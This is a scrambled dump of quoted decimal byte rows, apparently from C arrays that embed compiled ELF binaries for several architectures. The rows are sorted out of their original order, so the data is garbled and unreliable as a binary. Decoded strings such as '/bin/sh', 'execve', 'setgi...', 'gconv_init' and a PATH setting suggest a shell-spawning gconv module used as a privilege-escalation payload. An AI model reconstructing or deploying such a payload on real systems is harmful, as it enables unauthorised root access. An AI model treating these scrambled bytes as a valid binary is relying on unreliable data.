"  25, 0, 0, 0, 0, 0, 0, 0, 16, 62, 0, 0, 0, 0, 0, 0,"
"  25, 0, 0, 0, 0, 0, 0, 0, 240, 13, 1, 0, 0, 0, 0, 0,"
"  25, 0, 0, 0, 62, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  250, 255, 255, 111, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  252, 255, 255, 255, 133, 210, 116, 10, 131, 236, 8, 80, 81, 255, 210, 131,"
"  253, 0, 0, 0, 1, 0, 21, 0, 56, 16, 1, 0, 0, 0, 0, 0,"
"  253, 123, 190, 169, 253, 3, 0, 145, 243, 11, 0, 249, 147, 0, 0, 176,"
"  253, 123, 194, 168, 192, 3, 95, 214, 31, 32, 3, 213, 31, 32, 3, 213,"
"  253, 3, 0, 145, 224, 15, 0, 249, 0, 0, 0, 144, 0, 32, 29, 145,"
"  253, 3, 0, 145, 35, 0, 0, 148, 253, 123, 193, 168, 192, 3, 95, 214,"
"  254, 255, 255, 111, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0,"
"  254, 255, 255, 111, 0, 0, 0, 0, 224, 4, 0, 0, 0, 0, 0, 0,"
"  254, 72, 137, 240, 72, 193, 238, 63, 72, 193, 248, 3, 72, 1, 198, 72,"
"  255, 133, 192, 116, 19, 85, 137, 229, 131, 236, 20, 81, 255, 208, 131, 196,"
"  255, 163, 12, 0, 0, 0, 104, 0, 0, 0, 0, 233, 224, 255, 255, 255,"
"  255, 163, 16, 0, 0, 0, 104, 8, 0, 0, 0, 233, 208, 255, 255, 255,"
"  255, 163, 20, 0, 0, 0, 104, 16, 0, 0, 0, 233, 192, 255, 255, 255,"
"  255, 163, 24, 0, 0, 0, 104, 24, 0, 0, 0, 233, 176, 255, 255, 255,"
"  255, 179, 4, 0, 0, 0, 255, 163, 8, 0, 0, 0, 0, 0, 0, 0,"
"  255, 224, 102, 15, 31, 68, 0, 0, 195, 15, 31, 128, 0, 0, 0, 0,"
"  255, 255, 255, 111, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,"
"  255, 255, 255, 111, 1, 0, 0, 0, 240, 255, 255, 111, 52, 3, 0, 0,"
"  255, 37, 202, 47, 0, 0, 104, 3, 0, 0, 0, 233, 176, 255, 255, 255,"
"  255, 37, 210, 47, 0, 0, 104, 2, 0, 0, 0, 233, 192, 255, 255, 255,"
"  255, 37, 218, 47, 0, 0, 104, 1, 0, 0, 0, 233, 208, 255, 255, 255,"
"  255, 37, 226, 47, 0, 0, 104, 0, 0, 0, 0, 233, 224, 255, 255, 255,"
"  255, 53, 226, 47, 0, 0, 255, 37, 228, 47, 0, 0, 15, 31, 64, 0,"
"  26, 0, 0, 0, 0, 0, 0, 0, 24, 62, 0, 0, 0, 0, 0, 0,"
"  26, 0, 0, 0, 0, 0, 0, 0, 248, 13, 1, 0, 0, 0, 0, 0,"
"  26, 0, 0, 0, 20, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  26, 1, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  27, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  27, 0, 0, 0, 4, 0, 0, 0, 26, 0, 0, 0, 12, 63, 0, 0,"
"  27, 0, 0, 0, 7, 0, 0, 0, 2, 0, 0, 0, 116, 1, 0, 0,"
"  27, 12, 31, 0, 16, 0, 0, 0, 24, 0, 0, 0, 20, 254, 255, 255,"
"  27, 12, 4, 4, 136, 1, 0, 0, 32, 0, 0, 0, 28, 0, 0, 0,"
"  27, 12, 7, 8, 144, 1, 0, 0, 36, 0, 0, 0, 28, 0, 0, 0,"
"  28, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  28, 0, 0, 0, 4, 0, 0, 0, 245, 254, 255, 111, 192, 1, 0, 0,"
"  28, 0, 0, 0, 68, 0, 0, 0, 113, 240, 255, 255, 7, 0, 0, 0,"
"  28, 0, 27, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 0, 14, 1, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 16, 62, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 192, 15, 1, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 224, 63, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 232, 15, 1, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 24, 62, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 240, 13, 1, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 248, 13, 1, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 32, 62, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 48, 16, 1, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 56, 16, 1, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 56, 64, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 64, 64, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 0, 64, 0, 0, 2, 0, 0, 0, 32, 0, 0, 0,"
"  3, 0, 0, 0, 12, 63, 0, 0, 12, 47, 0, 0, 4, 0, 0, 0,"
"  3, 0, 0, 0, 20, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  3, 0, 0, 0, 240, 63, 0, 0, 240, 47, 0, 0, 16, 0, 0, 0,"
"  3, 0, 0, 0, 28, 64, 0, 0, 28, 48, 0, 0, 4, 0, 0, 0,"
"  3, 0, 0, 0, 71, 78, 85, 0, 118, 97, 69, 195, 79, 191, 211, 143,"
"  3, 0, 0, 0, 71, 78, 85, 0, 221, 53, 101, 229, 103, 138, 255, 122,"
"  3, 0, 0, 0, 71, 78, 85, 0, 23, 211, 159, 10, 87, 61, 50, 147,"
"  3, 0, 0, 0, 71, 78, 85, 0, 9, 243, 197, 73, 199, 224, 246, 249,"
"  3, 0, 183, 0, 1, 0, 0, 0, 240, 5, 0, 0, 0, 0, 0, 0,"
"  3, 0, 3, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 2, 0,"
"  3, 0, 3, 0, 1, 0, 0, 0, 128, 16, 0, 0, 52, 0, 0, 0,"
"  3, 0, 62, 0, 1, 0, 0, 0, 112, 16, 0, 0, 0, 0, 0, 0,"
"  3, 4, 0, 0, 0, 0, 0, 0, 128, 6, 0, 0, 0, 0, 0, 0,"
"  31, 0, 0, 0, 4, 0, 241, 255, 0, 0, 0, 0, 0, 0, 0, 0,"
"  31, 1, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  31, 32, 3, 213, 253, 123, 191, 169, 253, 3, 0, 145, 253, 123, 193, 168,"
"  32, 0, 0, 0, 123, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  32, 0, 0, 0, 151, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  32, 0, 0, 0, 232, 1, 0, 0, 141, 17, 0, 0, 126, 0, 0, 0,"
"  32, 0, 0, 0, 28, 0, 0, 0, 136, 239, 255, 255, 80, 0, 0, 0,"
"  32, 0, 0, 0, 3, 0, 0, 0, 196, 239, 255, 255, 60, 0, 0, 0,"
"  32, 0, 0, 0, 70, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  32, 0, 0, 0, 85, 0, 0, 0, 125, 17, 0, 0, 16, 0, 0, 0,"
"  32, 0, 0, 0, 92, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  32, 16, 0, 0, 0, 0, 0, 0, 80, 0, 0, 0, 0, 0, 0, 0,"
"  32, 2, 31, 214, 31, 32, 3, 213, 31, 32, 3, 213, 31, 32, 3, 213,"
"  32, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  32, 4, 0, 0, 0, 0, 0, 0, 168, 0, 0, 0, 0, 0, 0, 0,"
"  32, 46, 0, 0, 0, 0, 0, 0, 192, 1, 0, 0, 0, 0, 0, 0,"
"  32, 48, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  32, 62, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  32, 62, 0, 0, 0, 0, 0, 0, 32, 62, 0, 0, 0, 0, 0, 0,"
"  32, 64, 0, 0, 0, 0, 0, 0, 7, 0, 0, 0, 4, 0, 0, 0,"
"  33, 0, 0, 203, 34, 252, 127, 211, 65, 12, 129, 139, 33, 252, 65, 147,"
"  33, 241, 255, 255, 104, 0, 0, 0, 49, 241, 255, 255, 136, 0, 0, 0,"
"  34, 0, 0, 0, 109, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  34, 0, 0, 0, 119, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  36, 0, 0, 0, 0, 0, 0, 0, 36, 0, 0, 0, 0, 0, 0, 0,"
"  36, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0,"
"  36, 0, 0, 0, 28, 0, 0, 0, 136, 239, 255, 255, 80, 0, 0, 0,"
"  37, 40, 0, 0, 0, 72, 137, 69, 248, 49, 192, 72, 141, 5, 158, 14,"
"  4, 0, 0, 0, 0, 0, 0, 0, 119, 0, 0, 0, 9, 0, 0, 0,"
"  4, 0, 0, 0, 0, 0, 0, 0, 155, 0, 0, 0, 1, 0, 0, 0,"
"  4, 0, 0, 0, 0, 0, 0, 0, 177, 0, 0, 0, 1, 0, 0, 0,"
"  4, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0,"
"  4, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 2, 0, 0, 0,"
"  4, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 8, 0, 0, 0,"
"  4, 0, 0, 0, 0, 0, 0, 0, 46, 0, 0, 0, 7, 0, 0, 0,"
"  4, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  4, 0, 0, 0, 0, 0, 0, 0, 81, 229, 116, 100, 6, 0, 0, 0,"
"  4, 0, 0, 0, 0, 0, 0, 0, 83, 229, 116, 100, 4, 0, 0, 0,"
"  4, 0, 0, 0, 1, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  4, 0, 0, 0, 16, 0, 0, 0, 9, 0, 0, 0, 3, 0, 0, 0,"
"  4, 0, 0, 0, 21, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  4, 0, 0, 0, 3, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  4, 0, 0, 0, 4, 0, 0, 0, 116, 1, 0, 0, 116, 1, 0, 0,"
"  4, 0, 0, 0, 4, 0, 0, 0, 199, 0, 0, 0, 15, 0, 0, 0,"
"  4, 0, 0, 0, 4, 0, 0, 0, 216, 2, 0, 0, 0, 0, 0, 0,"
"  4, 0, 0, 0, 4, 0, 0, 0, 234, 0, 0, 0, 1, 0, 0, 0,"
"  4, 0, 0, 0, 4, 0, 0, 0, 75, 0, 0, 0, 11, 0, 0, 0,"
"  4, 0, 0, 0, 8, 0, 0, 0, 137, 0, 0, 0, 1, 0, 0, 0,"
"  4, 0, 0, 0, 8, 0, 0, 0, 220, 0, 0, 0, 1, 0, 0, 0,"
"  4, 0, 0, 0, 80, 229, 116, 100, 84, 32, 0, 0, 84, 32, 0, 0,"
"  4, 0, 0, 0, 80, 229, 116, 100, 92, 32, 0, 0, 92, 32, 0, 0,"
"  4, 0, 0, 0, 81, 229, 116, 100, 0, 0, 0, 0, 0, 0, 0, 0,"
"  4, 0, 0, 0, 83, 229, 116, 100, 152, 1, 0, 0, 152, 1, 0, 0,"
"  4, 0, 241, 255, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  4, 0, 241, 255, 12, 0, 0, 0, 144, 16, 0, 0, 0, 0, 0, 0,"
"  4, 0, 241, 255, 159, 0, 0, 0, 12, 33, 0, 0, 0, 0, 0, 0,"
"  4, 0, 241, 255, 159, 0, 0, 0, 20, 33, 0, 0, 0, 0, 0, 0,"
"  4, 0, 241, 255, 173, 0, 0, 0, 128, 16, 0, 0, 4, 0, 0, 0,"
"  4, 4, 0, 0, 24, 0, 0, 0, 96, 0, 0, 0, 161, 240, 255, 255,"
"  40, 0, 0, 0, 4, 0, 0, 0, 212, 239, 255, 255, 68, 0, 0, 0,"
"  40, 16, 1, 0, 0, 0, 0, 0, 2, 4, 0, 0, 9, 0, 0, 0,"
"  40, 3, 0, 0, 0, 0, 0, 0, 8, 1, 0, 0, 0, 0, 0, 0,"
"  40, 51, 0, 0, 0, 0, 0, 0, 185, 1, 0, 0, 0, 0, 0, 0,"
"  42, 0, 0, 0, 2, 0, 11, 0, 16, 6, 0, 0, 0, 0, 0, 0,"
"  42, 50, 36, 34, 28, 0, 0, 0, 64, 0, 0, 0, 177, 240, 255, 255,"
"  42, 51, 36, 34, 0, 0, 0, 0, 28, 0, 0, 0, 68, 0, 0, 0,"
"  45, 0, 0, 131, 196, 8, 91, 195, 0, 0, 0, 0, 0, 0, 0, 0,"
"  46, 0, 0, 131, 236, 4, 128, 187, 32, 0, 0, 0, 0, 117, 40, 139,"
"  46, 103, 111, 116, 0, 46, 103, 111, 116, 46, 112, 108, 116, 0, 46, 100,"
"  46, 105, 110, 105, 116, 0, 46, 116, 101, 120, 116, 0, 46, 102, 105, 110,"
"  46, 110, 111, 116, 101, 46, 103, 110, 117, 46, 98, 117, 105, 108, 100, 45,"
"  46, 115, 116, 114, 116, 97, 98, 0, 46, 115, 104, 115, 116, 114, 116, 97,"
"  46, 118, 101, 114, 115, 105, 111, 110, 0, 46, 103, 110, 117, 46, 118, 101,"
"  46, 50, 46, 53, 0, 95, 95, 103, 109, 111, 110, 95, 115, 116, 97, 114,"
"  46, 99, 0, 95, 95, 70, 82, 65, 77, 69, 95, 69, 78, 68, 95, 95,"
"  47, 0, 0, 1, 93, 195, 102, 46, 15, 31, 132, 0, 0, 0, 0, 0,"
"  47, 0, 0, 139, 131, 248, 255, 255, 255, 133, 192, 116, 2, 255, 208, 131,"
"  47, 115, 98, 105, 110, 58, 47, 117, 115, 114, 47, 98, 105, 110, 58, 47,"
"  47, 116, 114, 117, 101, 0, 0, 0, 80, 65, 84, 72, 61, 47, 117, 115,"
"  47, 117, 115, 114, 47, 98, 105, 110, 47, 116, 114, 117, 101, 0, 0, 0,"
"  47, 98, 105, 110, 47, 115, 104, 0, 80, 65, 84, 72, 61, 47, 117, 115,"
"  48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  48, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 44, 0, 0, 0,"
"  48, 0, 0, 0, 0, 0, 0, 0, 32, 48, 0, 0, 18, 0, 0, 0,"
"  48, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  48, 0, 95, 73, 84, 77, 95, 114, 101, 103, 105, 115, 116, 101, 114, 84,"
"  48, 16, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  48, 16, 0, 0, 80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  48, 16, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  48, 16, 1, 0, 0, 0, 0, 0, 200, 15, 1, 0, 0, 0, 0, 0,"
"  48, 16, 1, 0, 0, 0, 0, 0, 3, 4, 0, 0, 0, 0, 0, 0,"
"  48, 16, 1, 0, 0, 0, 0, 0, 71, 67, 67, 58, 32, 40, 71, 78,"
"  48, 17, 0, 0, 0, 0, 0, 0, 224, 16, 0, 0, 0, 0, 0, 0,"
"  48, 17, 0, 0, 0, 0, 0, 0, 24, 62, 0, 0, 0, 0, 0, 0,"
"  48, 254, 255, 255, 60, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0,"
"  48, 255, 255, 255, 180, 0, 0, 0, 56, 255, 255, 255, 200, 0, 0, 0,"
"  48, 4, 0, 0, 0, 0, 0, 0, 150, 0, 0, 0, 0, 0, 0, 0,"
"  48, 64, 0, 0, 0, 0, 0, 0, 7, 0, 0, 0, 7, 0, 0, 0,"
"  48, 7, 0, 0, 0, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0,"
"  49, 46, 51, 0, 0, 0, 0, 0, 2, 0, 3, 0, 0, 0, 3, 0,"
"  5, 0, 0, 0, 0, 0, 0, 0, 48, 4, 0, 0, 0, 0, 0, 0,"
"  5, 0, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  5, 0, 0, 0, 0, 0, 0, 0, 80, 3, 0, 0, 0, 0, 0, 0,"
"  5, 0, 0, 0, 1, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0,"
"  5, 0, 0, 0, 1, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  5, 0, 0, 0, 148, 2, 0, 0, 6, 0, 0, 0, 228, 1, 0, 0,"
"  5, 0, 0, 0, 71, 78, 85, 0, 1, 0, 1, 192, 4, 0, 0, 0,"
"  5, 147, 14, 0, 0, 72, 137, 69, 224, 72, 199, 69, 232, 0, 0, 0,"
"  5, 155, 14, 0, 0, 72, 137, 69, 224, 72, 199, 69, 232, 0, 0, 0,"
"  50, 46, 49, 55, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 2, 0,"
"  50, 46, 50, 46, 53, 0, 0, 0, 0, 0, 2, 0, 0, 0, 2, 0,"
"  50, 46, 50, 46, 53, 0, 103, 99, 111, 110, 118, 95, 105, 110, 105, 116,"
"  52, 255, 255, 255, 156, 0, 0, 0, 56, 255, 255, 255, 180, 0, 0, 0,"
"  52, 48, 0, 0, 16, 2, 0, 0, 26, 0, 0, 0, 23, 0, 0, 0,"
"  53, 167, 82, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  55, 0, 0, 0, 1, 0, 23, 0, 64, 64, 0, 0, 0, 0, 0, 0,"
"  55, 52, 0, 0, 254, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  56, 0, 0, 0, 6, 0, 0, 0, 116, 254, 255, 255, 80, 0, 0, 0,"
"  56, 16, 0, 0, 0, 0, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0,"
"  56, 16, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  56, 16, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  56, 2, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0,"
"  56, 48, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  56, 53, 0, 0, 0, 0, 0, 0, 52, 0, 32, 0, 10, 0, 40, 0,"
"  56, 54, 46, 103, 101, 116, 95, 112, 99, 95, 116, 104, 117, 110, 107, 46,"
"  56, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  56, 64, 0, 0, 0, 0, 0, 0, 224, 63, 0, 0, 0, 0, 0, 0,"
"  56, 64, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  57, 241, 255, 255, 136, 0, 0, 0, 183, 241, 255, 255, 164, 0, 0, 0,"
"  58, 201, 99, 84, 166, 136, 73, 45, 4, 0, 0, 0, 24, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 112, 16, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 112, 5, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 184, 17, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 24, 2, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 240, 5, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 32, 16, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 40, 3, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 48, 7, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 0, 0, 0, 88, 5, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 0, 16, 0, 0, 0, 16, 0, 0, 36, 0, 0, 0,"
"  6, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  6, 0, 0, 0, 128, 16, 0, 0, 128, 16, 0, 0, 143, 1, 0, 0,"
"  6, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  6, 2, 0, 0, 248, 63, 0, 0, 6, 4, 0, 0, 252, 63, 0, 0,"
"  6, 36, 224, 96, 87, 212, 30, 222, 243, 29, 180, 40, 0, 0, 0, 0,"
"  6, 66, 12, 7, 8, 0, 0, 0, 24, 0, 0, 0, 100, 0, 0, 0,"
"  6, 8, 0, 0, 12, 64, 0, 0, 7, 3, 0, 0, 16, 64, 0, 0,"
"  60, 0, 0, 0, 0, 0, 0, 0, 60, 0, 0, 0, 0, 0, 0, 0,"
"  60, 1, 0, 0, 18, 0, 12, 0, 57, 17, 0, 0, 0, 0, 0, 0,"
"  60, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  61, 2, 47, 0, 0, 0, 72, 137, 229, 116, 13, 72, 139, 61, 54, 47,"
"  63, 0, 0, 0, 0, 0, 13, 0, 72, 7, 0, 0, 0, 0, 0, 0,"
"  63, 0, 0, 0, 0, 0, 15, 0, 236, 7, 0, 0, 0, 0, 0, 0,"
"  63, 0, 0, 0, 0, 0, 15, 0, 244, 7, 0, 0, 0, 0, 0, 0,"
"  63, 0, 0, 0, 0, 0, 16, 0, 240, 13, 1, 0, 0, 0, 0, 0,"
"  63, 0, 0, 0, 0, 0, 21, 0, 48, 16, 1, 0, 0, 0, 0, 0,"
"  63, 0, 0, 235, 192, 0, 0, 84, 129, 0, 0, 144, 33, 228, 71, 249,"
"  64, 0, 0, 0, 0, 0, 0, 0, 216, 25, 0, 0, 0, 0, 0, 0,"
"  64, 0, 0, 0, 0, 0, 0, 0, 232, 53, 0, 0, 0, 0, 0, 0,"
"  64, 0, 0, 0, 185, 240, 255, 255, 16, 0, 0, 0, 0, 65, 14, 8,"
"  64, 0, 0, 0, 92, 254, 255, 255, 72, 0, 0, 0, 0, 65, 14, 32,"
"  64, 17, 0, 0, 0, 0, 0, 0, 118, 0, 0, 0, 0, 0, 0, 0,"
"  64, 255, 255, 255, 200, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0,"
"  64, 48, 0, 0, 0, 0, 0, 0, 18, 0, 0, 0, 0, 0, 0, 0,"
"  64, 48, 0, 0, 0, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0,"
"  64, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  64, 71, 76, 73, 66, 67, 95, 50, 46, 48, 0, 103, 99, 111, 110, 118,"
"  64, 71, 76, 73, 66, 67, 95, 50, 46, 50, 46, 53, 0, 101, 120, 105,"
"  65, 0, 0, 0, 246, 255, 255, 111, 2, 0, 0, 0, 192, 1, 0, 0,"
"  65, 1, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  65, 66, 76, 69, 95, 0, 95, 73, 84, 77, 95, 100, 101, 114, 101, 103,"
"  66, 0, 0, 0, 0, 0, 0, 0, 168, 5, 0, 0, 0, 0, 0, 0,"
"  66, 0, 0, 0, 0, 0, 0, 0, 200, 4, 0, 0, 0, 0, 0, 0,"
"  66, 67, 95, 50, 46, 49, 55, 0, 103, 99, 111, 110, 118, 0, 101, 120,"
"  67, 95, 50, 46, 49, 55, 0, 95, 95, 103, 109, 111, 110, 95, 115, 116,"
"  69, 72, 95, 70, 82, 65, 77, 69, 95, 72, 68, 82, 0, 95, 95, 84,"
"  69, 8, 137, 69, 212, 101, 161, 20, 0, 0, 0, 137, 69, 244, 49, 192,"
"  7, 0, 0, 0, 0, 0, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0,"
"  7, 0, 0, 0, 0, 0, 0, 0, 32, 4, 0, 0, 0, 0, 0, 0,"
"  7, 0, 0, 0, 0, 0, 0, 0, 66, 1, 0, 0, 18, 0, 0, 0,"
"  7, 0, 0, 0, 0, 0, 0, 0, 91, 0, 0, 0, 18, 0, 12, 0,"
"  7, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  7, 0, 0, 0, 5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  7, 5, 0, 0, 20, 64, 0, 0, 7, 6, 0, 0, 24, 64, 0, 0,"
"  7, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  70, 16, 0, 0, 0, 0, 0, 0, 86, 16, 0, 0, 0, 0, 0, 0,"
"  71, 67, 67, 58, 32, 40, 71, 78, 85, 41, 32, 49, 49, 46, 49, 46,"
"  71, 76, 73, 66, 67, 95, 50, 46, 48, 0, 101, 120, 101, 99, 118, 101,"
"  71, 78, 85, 0, 19, 29, 251, 41, 8, 122, 0, 94, 104, 142, 240, 34,"
"  71, 78, 85, 0, 209, 58, 106, 49, 216, 235, 19, 44, 44, 236, 37, 189,"
"  72, 0, 0, 0, 0, 65, 14, 32, 157, 4, 158, 3, 66, 147, 2, 78,"
"  72, 131, 196, 8, 195, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  72, 141, 61, 153, 47, 0, 0, 72, 141, 53, 146, 47, 0, 0, 72, 41,"
"  72, 141, 61, 201, 47, 0, 0, 72, 141, 5, 194, 47, 0, 0, 72, 57,"
"  72, 68, 82, 0, 95, 95, 84, 77, 67, 95, 69, 78, 68, 95, 95, 0,"
"  72, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,"
"  72, 7, 0, 0, 0, 0, 0, 0, 83, 0, 0, 0, 0, 0, 0, 0,"
"  72, 7, 0, 0, 0, 0, 0, 0, 91, 0, 0, 0, 0, 0, 0, 0,"
"  73, 66, 67, 95, 50, 46, 48, 0, 71, 76, 73, 66, 67, 95, 50, 46,"
"  74, 73, 11, 247, 168, 111, 232, 233, 24, 248, 216, 220, 0, 0, 0, 0,"
"  76, 3, 0, 0, 48, 0, 0, 0, 5, 0, 0, 0, 1, 0, 0, 0,"
"  76, 69, 95, 0, 95, 73, 84, 77, 95, 100, 101, 114, 101, 103, 105, 115,"
"  76, 73, 66, 67, 95, 50, 46, 49, 46, 51, 0, 115, 101, 116, 103, 105,"
"  76, 73, 66, 67, 95, 50, 46, 50, 46, 53, 0, 95, 95, 99, 120, 97,"
"  76, 79, 66, 65, 76, 95, 79, 70, 70, 83, 69, 84, 95, 84, 65, 66,"
"  77, 67, 108, 111, 110, 101, 84, 97, 98, 108, 101, 0, 103, 99, 111, 110,"
"  77, 67, 108, 111, 110, 101, 84, 97, 98, 108, 101, 0, 95, 73, 84, 77,"
"  77, 67, 95, 69, 78, 68, 95, 95, 0, 95, 71, 76, 79, 66, 65, 76,"
"  78, 68, 95, 95, 0, 95, 102, 105, 110, 105, 0, 95, 95, 100, 115, 111,"
"  8, 0, 0, 0, 0, 0, 0, 0, 158, 1, 0, 0, 18, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 168, 0, 0, 0, 0, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 182, 0, 0, 0, 15, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 194, 0, 0, 0, 6, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 201, 0, 0, 0, 15, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 208, 0, 0, 0, 1, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 213, 0, 0, 0, 6, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 217, 0, 0, 0, 1, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 224, 16, 0, 0, 0, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 227, 0, 0, 0, 1, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 236, 0, 0, 0, 1, 0, 0, 0,"
"  8, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 4, 0, 0, 0,"
